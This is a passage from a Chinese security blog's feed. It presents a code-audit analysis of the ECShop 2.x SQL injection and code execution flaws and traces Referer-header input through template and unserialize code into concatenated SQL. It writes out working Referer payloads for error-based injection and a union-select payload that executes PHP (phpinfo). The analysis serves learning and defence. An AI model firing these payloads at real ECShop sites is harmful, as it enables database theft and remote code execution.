flag&quot;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;?&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="代码审计" scheme="https://c1aysec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://c1aysec.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Ecshop2.x注入漏洞&amp;代码执行漏洞分析</title>
    <link href="https://c1aysec.github.io/2018/09/07/Ecshop2.x%20&amp;%203.x%E7%89%88%E6%9C%AC%E6%9C%80%E6%96%B0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <id>https://c1aysec.github.io/2018/09/07/Ecshop2.x &amp; 3.x版本最新漏洞分析与利用/</id>
    <published>2018-09-07T01:22:48.000Z</published>
    <updated>2018-12-19T11:33:34.123Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ecshop2-x注入漏洞-amp-代码执行漏洞分析"><a href="#Ecshop2-x注入漏洞-amp-代码执行漏洞分析" class="headerlink" title="Ecshop2.x注入漏洞&amp;代码执行漏洞分析"></a>Ecshop2.x注入漏洞&amp;代码执行漏洞分析</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>Ecshop最近爆出了两个高危漏洞，分别是SQL注入漏洞和代码执行漏洞，刚好自己在学代码审计方面的知识，于是自己针对两个漏洞的成因分析了一波，发现这是一个很有意思的二次漏洞，在这将整个学习过程做个记录</strong><br><a id="more"></a></p><h3 id="SQL注入漏洞分析"><a href="#SQL注入漏洞分析" class="headerlink" title="SQL注入漏洞分析"></a>SQL注入漏洞分析</h3><p><strong>在分析漏洞之前首先来看其中的一个payload</strong></p><pre><code>访问:http://site/user.php?act=login然后在http请求头里面添加：Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}</code></pre><p><strong>由payload看到漏洞的入口位置在<code>user.php</code>这个文件内，通过<code>act=login</code>关键字定位到相关的代码位置</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* 用户登录界面 */</span></div><div class="line"><span class="keyword">elseif</span> ($action == <span class="string">'login'</span>)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($back_act))</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($back_act) &amp;&amp; <span class="keyword">isset</span>($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>]))</div><div class="line">        &#123;</div><div class="line">            $back_act = strpos($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>], <span class="string">'user.php'</span>) ? <span class="string">'./index.php'</span> : $GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>];</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            $back_act = <span class="string">'user.php'</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    $captcha = intval($_CFG[<span class="string">'captcha'</span>]);</div><div class="line">    <span class="keyword">if</span> (($captcha &amp; CAPTCHA_LOGIN) &amp;&amp; (!($captcha &amp; CAPTCHA_LOGIN_FAIL) || (($captcha &amp; CAPTCHA_LOGIN_FAIL) &amp;&amp; $_SESSION[<span class="string">'login_fail'</span>] &gt; <span class="number">2</span>)) &amp;&amp; gd_version() &gt; <span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'enabled_captcha'</span>, <span class="number">1</span>);</div><div class="line">        $GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'rand'</span>, mt_rand());</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $smarty-&gt;assign(<span class="string">'back_act'</span>, $back_act);</div><div class="line">    $smarty-&gt;display(<span class="string">'user_passport.dwt'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>传入的Referer的值被<code>$GLOBALS[&#39;_SERVER&#39;][&#39;HTTP_REFERER&#39;]</code>这个服务器全局变量接收后到赋值给<code>$back_act</code>，之后<code>$back_act</code>变量作为参数传入<code>assign</code>方法，这个函数的功能主要用于注册模板变量，之后<code>$back_act</code>变量的值便赋值给了模板文件当中的<code>$back_act</code>变量，注册模板变量的代码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * 注册变量</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@access</span>  public</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span>   mix      $tpl_var</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span>   mix      $value</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@return</span>  void</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">assign</span><span class="params">($tpl_var, $value = <span class="string">''</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (is_array($tpl_var))</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">foreach</span> ($tpl_var <span class="keyword">AS</span> $key =&gt; $val)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> ($key != <span class="string">''</span>)</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">$this</span>-&gt;_var[$key] = $val;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> ($tpl_var != <span class="string">''</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;_var[$tpl_var] = $value;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>之后回到<code>user.php</code>，又调用了<code>display</code>这个方法，传入的参数是<code>user_passport.dwt</code>这个模板文件（这时模板文件当中的<code>$back_act</code>变量已经被注册为传入的Referer值），模板文件关键内容如下</strong></p><p><img src="http://pic.c1imber.top/blog/180907/DJEb9867Hm.png?imageslim" alt="mark"><br><strong>跟进到<code>display</code>函数代码的相关位置，代码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * 显示页面函数</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@access</span>  public</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span>   string      $filename</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span>   sting      $cache_id</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@return</span>  void</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($filename, $cache_id = <span class="string">''</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">$this</span>-&gt;_seterror++;</div><div class="line">    error_reporting(E_ALL ^ E_NOTICE);</div><div class="line"></div><div class="line">    <span class="keyword">$this</span>-&gt;_checkfile = <span class="keyword">false</span>;</div><div class="line">    $out = <span class="keyword">$this</span>-&gt;fetch($filename, $cache_id);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (strpos($out, <span class="keyword">$this</span>-&gt;_echash) !== <span class="keyword">false</span>)</div><div class="line">    &#123;</div><div class="line">        $k = explode(<span class="keyword">$this</span>-&gt;_echash, $out);</div><div class="line">        <span class="keyword">foreach</span> ($k <span class="keyword">AS</span> $key =&gt; $val)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> (($key % <span class="number">2</span>) == <span class="number">1</span>)</div><div class="line">            &#123;</div><div class="line">                $k[$key] = <span class="keyword">$this</span>-&gt;insert_mod($val);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        $out = implode(<span class="string">''</span>, $k);</div><div class="line">    &#125;</div><div class="line">    error_reporting(<span class="keyword">$this</span>-&gt;_errorlevel);</div><div class="line">    <span class="keyword">$this</span>-&gt;_seterror--;</div><div class="line"></div><div class="line">    <span class="keyword">echo</span> $out;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>display函数当中的<code>fetch</code>方法会对<code>user_passport.dwt</code>这个模板文件当中的变量进行解析，这时模板文件当中的<code>$back_act</code>变量和模板当中其它的变量经过<code>fetch</code>函数里面的<code>make_compiled</code>函数后被解析，经过处理之后的模板文件内容将返回给<code>$out</code>这个变量</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * 处理模板文件</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@access</span>  public</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span>   string      $filename</span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span>   sting      $cache_id</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * <span class="doctag">@return</span>  sring</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($filename, $cache_id = <span class="string">''</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_seterror)</div><div class="line">    &#123;</div><div class="line">        error_reporting(E_ALL ^ E_NOTICE);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">$this</span>-&gt;_seterror++;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (strncmp($filename,<span class="string">'str:'</span>, <span class="number">4</span>) == <span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        $out = <span class="keyword">$this</span>-&gt;_eval(<span class="keyword">$this</span>-&gt;fetch_str(substr($filename, <span class="number">4</span>)));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_checkfile)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> (!file_exists($filename))</div><div class="line">            &#123;</div><div class="line">                $filename = <span class="keyword">$this</span>-&gt;template_dir . <span class="string">'/'</span> . $filename;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            $filename = <span class="keyword">$this</span>-&gt;template_dir . <span class="string">'/'</span> . $filename;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;direct_output)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;_current_file = $filename;</div><div class="line"></div><div class="line">            $out = <span class="keyword">$this</span>-&gt;_eval(<span class="keyword">$this</span>-&gt;fetch_str(file_get_contents($filename)));</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> ($cache_id &amp;&amp; <span class="keyword">$this</span>-&gt;caching)</div><div class="line">            &#123;</div><div class="line">                $out = <span class="keyword">$this</span>-&gt;template_out;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">            &#123;</div><div class="line">                <span class="keyword">if</span> (!in_array($filename, <span class="keyword">$this</span>-&gt;template))</div><div class="line">                &#123;</div><div class="line">                    <span class="keyword">$this</span>-&gt;template[] = $filename;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                $out = <span class="keyword">$this</span>-&gt;make_compiled($filename);</div><div class="line"></div><div class="line">                <span class="keyword">if</span> ($cache_id)</div><div class="line">                &#123;</div><div class="line">                    $cachename = basename($filename, strrchr($filename, <span class="string">'.'</span>)) . <span class="string">'_'</span> . $cache_id;</div><div class="line">                    $data = serialize(<span class="keyword">array</span>(<span class="string">'template'</span> =&gt; <span class="keyword">$this</span>-&gt;template, <span class="string">'expires'</span> =&gt; <span class="keyword">$this</span>-&gt;_nowtime + <span class="keyword">$this</span>-&gt;cache_lifetime, <span class="string">'maketime'</span> =&gt; <span class="keyword">$this</span>-&gt;_nowtime));</div><div class="line">                    $out = str_replace(<span class="string">"\r"</span>, <span class="string">''</span>, $out);</div><div class="line"></div><div class="line">                    <span class="keyword">while</span> (strpos($out, <span class="string">"\n\n"</span>) !== <span class="keyword">false</span>)</div><div class="line">                    &#123;</div><div class="line">                        $out = str_replace(<span class="string">"\n\n"</span>, <span class="string">"\n"</span>, $out);</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    $hash_dir = <span class="keyword">$this</span>-&gt;cache_dir . <span class="string">'/'</span> . substr(md5($cachename), <span class="number">0</span>, <span class="number">1</span>);</div><div class="line">                    <span class="keyword">if</span> (!is_dir($hash_dir))</div><div class="line">                    &#123;</div><div class="line">                        mkdir($hash_dir);</div><div class="line">                    &#125;</div><div class="line">                    <span class="keyword">if</span> (file_put_contents($hash_dir . <span class="string">'/'</span> . $cachename . <span class="string">'.php'</span>, <span class="string">'&lt;?php exit;?&gt;'</span> . $data . $out, LOCK_EX) === <span class="keyword">false</span>)</div><div class="line">                    &#123;</div><div class="line">                        trigger_error(<span class="string">'can\'t write:'</span> . $hash_dir . <span class="string">'/'</span> . $cachename . <span class="string">'.php'</span>);</div><div class="line">                    &#125;</div><div class="line">                    <span class="keyword">$this</span>-&gt;template = <span class="keyword">array</span>();</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">$this</span>-&gt;_seterror--;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_seterror)</div><div class="line">    &#123;</div><div class="line">        error_reporting(<span class="keyword">$this</span>-&gt;_errorlevel);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> $out; <span class="comment">// 返回html数据</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>之后判断返回的<code>$out</code>内容中是否有<code>_echash</code>这个值，如果存在，<code>_echash</code>的值将作为分割符对<code>$out</code>的内容进行分割，返回一个索引数组，将索引值为奇数的数组值传入<code>insert_mod</code>方法，ecshop2.x的<code>_echash</code>值如下</strong></p><p><img src="http://pic.c1imber.top/blog/180907/L36k2Fdfc0.png?imageslim" alt="mark"></p><p><strong>这也就是之前payload里面的那串hash值，这时payload当中<code>_echash</code>后面的那些内容<code>ads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}</code>就会被传入<code>insert_mod</code>方法</strong></p><p><strong>跟进<code>insert_mode</code>这个函数</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_mod</span><span class="params">($name)</span> // 处理动态内容</span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">list</span>($fun, $para) = explode(<span class="string">'|'</span>, $name);</div><div class="line">    $para = unserialize($para);</div><div class="line">    $fun = <span class="string">'insert_'</span> . $fun;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> $fun($para);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>此时传入的内容<code>$name</code>为<code>ads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}</code>，之后使用<code>expload</code>函数以<code>|</code>为分割符将传入的内容分为两部分，第一部分为<code>ads</code>，与<code>insert_</code>拼接后做为该函数的回调函数<code>insert_ads</code>,第二部为<code>a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}</code>这个序列化字符串，经过<code>unserialize</code>函数处理后返回一个数组，这个数组会被当作回调函数<code>insert_ads</code>的参数，接下来定位到<code>insert_ads</code>这个函数的位置，和SQL注入相关的代码部分如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_ads</span><span class="params">($arr)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">static</span> $static_res = <span class="keyword">NULL</span>;</div><div class="line"></div><div class="line">    $time = gmtime();</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($arr[<span class="string">'num'</span>]) &amp;&amp; $arr[<span class="string">'num'</span>] != <span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        $sql  = <span class="string">'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, '</span> .</div><div class="line">                    <span class="string">'p.ad_height, p.position_style, RAND() AS rnd '</span> .</div><div class="line">                <span class="string">'FROM '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad'</span>) . <span class="string">' AS a '</span>.</div><div class="line">                <span class="string">'LEFT JOIN '</span> . $GLOBALS[<span class="string">'ecs'</span>]-&gt;table(<span class="string">'ad_position'</span>) . <span class="string">' AS p ON a.position_id = p.position_id '</span> .</div><div class="line">                <span class="string">"WHERE enabled = 1 AND start_time &lt;= '"</span> . $time . <span class="string">"' AND end_time &gt;= '"</span> . $time . <span class="string">"' "</span>.</div><div class="line">                    <span class="string">"AND a.position_id = '"</span> . $arr[<span class="string">'id'</span>] . <span class="string">"' "</span> .</div><div class="line">                <span class="string">'ORDER BY rnd LIMIT '</span> . $arr[<span class="string">'num'</span>];</div><div class="line">        $res = $GLOBALS[<span class="string">'db'</span>]-&gt;GetAll($sql);</div><div class="line">    &#125;</div><div class="line">...后面的代码忽略</div></pre></td></tr></table></figure><p><strong>可以看到将数组的值直接拼接到了sql语句中，所以到这已经成功定位到了注入漏洞的位置，在这里可以注入的位置有两个，分别是<code>$arr[&#39;id&#39;]</code>的位置和<code>$arr[&#39;num&#39;]</code>的位置，由于注入点的不同，构造payload的方式也不同，通过之前的一步步分析，payload的构造格式也很清楚了，需要写成<code>echash+ads+序列化处理后的索引数组(里面的键值为注入的payload)</code>，下面来构造payload</strong></p><p><strong>首先是<code>$arr[&#39;id&#39;]</code>这个位置，关于这个位置无需多说，使用正常的报错注入方法就行，构造payload</strong><br><img src="http://pic.c1imber.top/blog/180907/KKie54eEAF.png?imageslim" alt="mark"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Referer: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">"name"</span>;i:<span class="number">1</span>;s:<span class="number">2</span>:<span class="string">"id"</span>;s:<span class="number">49</span>:<span class="string">"' and extractvalue(1,concat(0x3a,user(),0x3a))-- "</span>;&#125;</div></pre></td></tr></table></figure></p><p><strong>可以看到成功报错出了数据库的信息</strong><br><img src="http://pic.c1imber.top/blog/181019/fafJlkgiH2.png?imageslim" alt="mark"></p><p><strong>接下来是<code>$arr[&#39;num&#39;]</code>这个位置的注入，这个位置的注入比较特殊，因为它在limit的后面，因为mysql的语法规则，在limit后面只能使用<code>procedure analyse</code>这个函数去进行报错注入，并且有很多的局限性，下面先来简单说一下有关这个函数的使用</strong></p><pre><code>1.该函数的参数为两个，并且只有两个参数时才能报错，两个参数的位置均可以报错2.使用updatexml，extractvalue等报错函数报错查询数据时，不能在报错函数内使用select关键字查询数据3.可以时间盲注，但是不能使用sleep函数，但是可以使用benchmark函数取替代sleep</code></pre><p><strong>报错注入利用</strong><br><img src="http://pic.c1imber.top/blog/180907/iAl82c7LgF.png?imageslim" alt="mark"><br><strong>时间盲注利用</strong><br><img src="http://pic.c1imber.top/blog/180907/09JabDCCDd.png?imageslim" alt="mark"><br><strong>构造payload</strong><br><img src="http://pic.c1imber.top/blog/180907/3Gfcibd25b.png?imageslim" alt="mark"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Referer: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">"num"</span>;s:<span class="number">63</span>:<span class="string">"0,1 procedure analyse(extractvalue(1,concat(0x3a,user())),1)-- "</span>;s:<span class="number">2</span>:<span class="string">"id"</span>;i:<span class="number">1</span>;&#125;</div></pre></td></tr></table></figure></p><p><img src="http://pic.c1imber.top/blog/181019/m7ffIK0FgH.png?imageslim" alt="mark"></p><h3 id="代码执行漏洞分析"><a href="#代码执行漏洞分析" class="headerlink" title="代码执行漏洞分析"></a>代码执行漏洞分析</h3><p><strong>以下payload用于执行phpinfo()</strong></p><pre><code>访问:http://site/user.php?act=login然后在http请求头里面添加：Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&apos; /*&quot;;}554fcae493e564ee0dc75bdf2ebf94ca</code></pre><p><img src="http://pic.c1imber.top/blog/181019/hA0H6K4gFg.png?imageslim" alt="mark"><br><strong>首先继续看<code>insert_ads</code>函数，这里的代码执行是一个经典的二次漏洞，相关的重要代码部分如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">$position_style = <span class="string">''</span>;</div><div class="line"></div><div class="line"><span class="keyword">foreach</span> ($res <span class="keyword">AS</span> $row)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> ($row[<span class="string">'position_id'</span>] != $arr[<span class="string">'id'</span>])</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">continue</span>;</div><div class="line">    &#125;</div><div class="line">    $position_style = $row[<span class="string">'position_style'</span>];</div><div class="line">    ...省略无关部分</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$position_style = <span class="string">'str:'</span> . $position_style;</div><div class="line"></div><div class="line">$need_cache = $GLOBALS[<span class="string">'smarty'</span>]-&gt;caching;</div><div class="line">$GLOBALS[<span class="string">'smarty'</span>]-&gt;caching = <span class="keyword">false</span>;</div><div class="line"></div><div class="line">$GLOBALS[<span class="string">'smarty'</span>]-&gt;assign(<span class="string">'ads'</span>, $ads);</div><div class="line">$val = $GLOBALS[<span class="string">'smarty'</span>]-&gt;fetch($position_style);</div><div class="line"></div><div class="line">$GLOBALS[<span class="string">'smarty'</span>]-&gt;caching = $need_cache;</div><div class="line"></div><div class="line"><span class="keyword">return</span> $val;</div></pre></td></tr></table></figure><p><strong>之前的过程和注入漏洞过程一样，经过一系列处理后，<code>$arr[&#39;id&#39;]</code>的值变为<code>&#39; /*</code>,<code>$arr[&#39;num&#39;]</code>的值变为<code>*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b706870696e666f2f2a2a2f28293b2f2f7d,10-- -</code>,之后<code>$arr[&#39;id&#39;]</code>和<code>$arr[&#39;num&#39;]</code>拼接进sql语句后执行的sql如下</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, <span class="keyword">RAND</span>() <span class="keyword">AS</span> rnd <span class="keyword">FROM</span> <span class="string">`ecshop273`</span>.<span class="string">`ecs_ad`</span> <span class="keyword">AS</span> a <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> <span class="string">`ecshop273`</span>.<span class="string">`ecs_ad_position`</span> <span class="keyword">AS</span> p <span class="keyword">ON</span> a.position_id = p.position_id <span class="keyword">WHERE</span> enabled = <span class="number">1</span> <span class="keyword">AND</span> start_time &lt;= <span class="string">'1539915783'</span> <span class="keyword">AND</span> end_time &gt;= <span class="string">'1539915783'</span> <span class="keyword">AND</span> a.position_id = <span class="string">''</span> <span class="comment">/*' ORDER BY rnd LIMIT */</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">0x27202f2a</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d</span>,<span class="number">10</span><span class="comment">-- -</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/181019/8ACLcmbemg.png?imageslim" 